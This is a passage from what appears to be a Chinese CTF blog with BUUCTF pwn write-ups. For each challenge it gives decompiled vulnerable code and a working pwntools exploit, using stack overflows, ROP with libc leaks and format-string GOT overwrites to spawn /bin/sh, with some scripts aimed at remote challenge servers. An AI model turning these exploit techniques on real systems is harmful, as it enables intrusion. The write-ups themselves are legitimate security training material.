class="string">b&quot;a&quot;</span> * <span class="number">64</span> + <span class="string">b&quot;b&quot;</span> * <span class="number">8</span> + p64(<span class="number">0x0000000000400611</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h3><p>题目如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int func()</span><br><span class="line">&#123;</span><br><span class="line">  char v1[44]; // [rsp+0h] [rbp-30h] BYREF</span><br><span class="line">  float v2; // [rsp+2Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v2 = 0.0;</span><br><span class="line">  puts(&quot;Let&#x27;s guess the number.&quot;);</span><br><span class="line">  gets(v1);</span><br><span class="line">  if ( v2 == 11.28125 )</span><br><span class="line">    return system(&quot;cat /flag&quot;);</span><br><span class="line">  else</span><br><span class="line">    return puts(&quot;Its value should be 11.28125&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>栈溢出到v2, 使v2为<code>11.28125</code>即可</p><h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">p = process(<span class="string">&quot;./ciscn_2019_n_1&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;1&quot;</span> * <span class="number">44</span> + struct.pack(<span class="string">&quot;&lt;f&quot;</span>, <span class="number">11.28125</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h3><p>32位C++, 开启了<code>NX</code>， 但这题用不到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  pwn1_sctf_2016 checksec pwn1_sctf_2016</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line">  <span class="built_in">fgets</span>(s, <span class="number">32</span>, edata);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, s);</span><br><span class="line">  std::allocator&lt;<span class="keyword">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">  std::string::<span class="built_in">string</span>(v4, <span class="string">&quot;you&quot;</span>, &amp;v5);</span><br><span class="line">  std::allocator&lt;<span class="keyword">char</span>&gt;::<span class="built_in">allocator</span>(v7);</span><br><span class="line">  std::string::<span class="built_in">string</span>(v6, <span class="string">&quot;I&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">replace</span>((std::string *)v3);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, v3, v6, v4);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v3);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v6);</span><br><span class="line">  std::allocator&lt;<span class="keyword">char</span>&gt;::~<span class="built_in">allocator</span>(v7);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v4);</span><br><span class="line">  std::allocator&lt;<span class="keyword">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">  v0 = (<span class="keyword">const</span> <span class="keyword">char</span> *)std::string::<span class="built_in">c_str</span>((std::string *)&amp;input);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;So, %s\n&quot;</span>, s);</span><br></pre></td></tr></table></figure><p>存在<code>get_flag</code>函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会将输入的<code>I</code>替换为<code>you</code>, 造成溢出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  pwn1_sctf_2016 ./pwn1_sctf_2016</span><br><span class="line">Tell me something about yourself: IIII</span><br><span class="line">So, youyouyouyou</span><br></pre></td></tr></table></figure><h4 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn1_sctf_2016/pwn1_sctf_2016&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;I&quot;</span> * <span class="number">0x14</span> + <span class="string">b&quot;2&quot;</span> * <span class="number">4</span> + p32(<span class="number">0x8048F13</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h3><p>基础栈溢出, 直接溢出到 backdoor 就可以了</p><h4 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./level0)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">27700</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * (<span class="number">128</span> + <span class="number">8</span>) + p64(<span class="number">0x000000000400596</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Hello, World\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h3><p>基础栈溢出, 没有后门函数但是有<code>system</code>函数, 且 IDA 搜索字符串有<code>/bin/sh</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:0804A024 hint            db &#x27;/bin/sh&#x27;,0</span><br></pre></td></tr></table></figure><p>那么思路就是栈溢出到system, 且布局栈中有参数 <code>/bin/sh</code> 的地址就可以 getshell 了</p><h4 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./level2&quot;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">25988</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * (<span class="number">136</span> + <span class="number">4</span>) + p32(<span class="number">0x8048320</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x804a024</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf 2017 babyheap"></a>0ctf 2017 babyheap</h3><p><a href="https://lantern.cool/wp-item-0ctf-2017-babyheap/">0ctf 2017 babyheap</a></p><h3 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  ciscn_2019_c_1 checksec ciscn_2019_c_1</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>64位ELF, 开了NX, 一个加解密程序，encrypt可用</p><p>其中encrypt</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">encrypt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  _WORD v3[<span class="number">16</span>]; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>);</span><br><span class="line">  gets(s);                                      <span class="comment">// stack overflow</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xF</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciphertext&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目没有system和/bin/sh所以需要构造ROP, 并且没有给出libc文件，需要leak</p><p>根据64位传参规则，puts函数传入参数为<code>rdi</code>， 所以需要<code>pop rdi</code>的gadget</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  ciscn_2019_c_1 ROPgadget --binary ciscn_2019_c_1 |grep &quot;pop rdi&quot;</span><br><span class="line">0x0000000000400c83 : pop rdi ; ret</span><br></pre></td></tr></table></figure><p>由于线上环境为ubuntu18，故调用system需要栈对齐<a target="_blank" rel="noopener" href="http://blog.eonew.cn/archives/958">在一些64位的glibc的payload调用system函数失败问题 – Ex个人博客 (eonew.cn)</a></p><p>多加个ret使栈对齐即可</p><h4 id="EXP-6"><a href="#EXP-6" class="headerlink" title="EXP"></a>EXP</h4><p>本来输入时是需要先进行decrypt的，这样才能使encrypt后变为我们想要的数据，但根据<code>strlen</code>的截断为<code>\x00</code>以及地址<code>b9 06 40</code>不在加密范围内，故实际打的时候不需要</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ciscn_2019_c_1/ciscn_2019_c_1&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_c_1/ciscn_2019_c_1&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi_addr = <span class="number">0x0000000000400c83</span></span><br><span class="line">ret_addr = <span class="number">0x00000000004006b9</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">gets_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;puts_plt =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(puts_plt)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;puts_got =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(puts_got)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;gets_got =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(gets_got)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;choice!\n&quot;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span> * <span class="number">88</span></span><br><span class="line">payload += p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&quot;@&quot;</span>)</span><br><span class="line">rl()</span><br><span class="line"></span><br><span class="line">puts_leak = u64(rl()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">log.success(<span class="string">f&quot;puts_leak =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(puts_leak)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_leak)</span><br><span class="line">libc_base = puts_leak - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">str_bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;libc_base =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;sys_addr =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(sys_addr)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;str_bin_sh_addr =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(str_bin_sh_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;choice!\n&quot;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span> * <span class="number">88</span></span><br><span class="line">payload += p64(ret_addr)</span><br><span class="line">payload += p64(pop_rdi_addr) + p64(str_bin_sh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ia() </span><br></pre></td></tr></table></figure><h3 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211020145931370.png" alt="image-20211020145931370"></p><p>存在格式化字符串漏洞，先通过<code>%p</code>查看我们输入的值位于哪里</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  Pwn ./\[第五空间2019\ 决赛\]PWN5/pwn</span><br><span class="line">your name:aaaa%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p    </span><br><span class="line">Hello,aaaa-0xffd74948-0x63-(nil)-0xf7fcaa9c-0x3-0xf7f9d410-0x1-(nil)-0x1-0x61616161-0x2d70252d</span><br></pre></td></tr></table></figure><p>可以看出，位于第10个参数</p><p>由于本题的限制较少，故我们有以下几种做法</p><ol><li>覆盖<code>dword_0804C044</code>的值</li><li>将<code>dword_0804C044</code>的值读出</li><li>覆盖<code>atoi</code>函数的地址为<code>system</code>， 传入<code>/bin/sh</code>获得<code>shell</code></li></ol><h4 id="EXP1"><a href="#EXP1" class="headerlink" title="EXP1"></a>EXP1</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data_addr = <span class="number">0x0804C044</span></span><br><span class="line">payload = p32(data_addr) + <span class="string">b&quot;%10$n&quot;</span> <span class="comment"># 将0x0804C044处的值覆盖为已输出的字符串长度，即4</span></span><br><span class="line">sl(payload)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h4 id="EXP2"><a href="#EXP2" class="headerlink" title="EXP2"></a>EXP2</h4><p>这里需要注意，输入的<code>atoi</code>函数传入有符号，最大只能<code>0x7fffffff</code>, 所以…概率成功</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-v&#x27;</span>]</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data_addr = <span class="number">0x0804C044</span></span><br><span class="line">payload = p32(data_addr) + <span class="string">b&quot;%10$s&quot;</span></span><br><span class="line">sd(payload)</span><br><span class="line">ru(p32(data_addr))</span><br><span class="line">data = u32(rv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">f&quot;data =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(data)&#125;</span>&quot;</span>)</span><br><span class="line">sd(<span class="built_in">str</span>(data))</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h4 id="EXP3"><a href="#EXP3" class="headerlink" title="EXP3"></a>EXP3</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-v&#x27;</span>]</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data_addr = <span class="number">0x0804C044</span></span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>, &#123;atoi_got: system_plt&#125;)</span><br><span class="line">sl(payload)</span><br><span class="line">sl(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h3><p><code>checksec</code> 一下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  [OGeek2019]babyrop checksec pwn</span><br><span class="line">[*] &#x27;/mnt/c/Users/Lantern/Documents/Lantern/CTF/Games/BUUCTF/Pwn/[OGeek2019]babyrop/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>首先要求输入等于一个随机数，但由于<code>strlen</code>是<code>\x00</code>截断，可以将v5设置为0过掉<code>strncmp</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_804871F</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v5; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%ld&quot;</span>, a1);</span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">32u</span>);</span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);                             <span class="comment">// \x00截断</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, s, v1) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> __int8)buf[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着将我们的输入的<code>buf[7]</code>传入下面的函数接受读入, 存在栈溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __cdecl <span class="title">sub_80487D0</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">231</span>]; <span class="comment">// [esp+11h] [ebp-E7h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0x7F</span> )</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0xC8</span>u);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, a1);                    <span class="comment">// a1 &gt;= 231即栈溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="EXP-7"><a href="#EXP-7" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">ip_port = <span class="string">&quot;node4.buuoj.cn:26681&quot;</span>.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">ip = ip_port[<span class="number">0</span>]</span><br><span class="line">port = ip_port[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(ip, port)</span><br><span class="line"></span><br><span class="line">lib = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048825</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span> + <span class="string">b&quot;\xff&quot;</span> * <span class="number">7</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0xe7</span> + <span class="string">b&quot;b&quot;</span> * <span class="number">0x4</span></span><br><span class="line">payload += p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">0x8</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">read_addr = u32(rv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">f&quot;read_addr: <span class="subst">&#123;<span class="built_in">hex</span>(read_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">lib.address = read_addr - lib.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr = lib.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = <span class="built_in">next</span>(lib.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span> + <span class="string">b&quot;\xff&quot;</span> * <span class="number">7</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0xe7</span> + <span class="string">b&quot;b&quot;</span> * <span class="number">0x4</span></span><br><span class="line">payload += p32(system_addr) * <span class="number">2</span> + p32(binsh_addr)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ciscn_2019_n_8 checksec ciscn_2019_n_8</span><br><span class="line">[*] &#x27;/mnt/c/Users/Lantern/Documents/Lantern/CTF/Games/BUUCTF/Pwn/ciscn_2019_n_8/ciscn_2019_n_8&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>保护全开</p><figure class="highlight 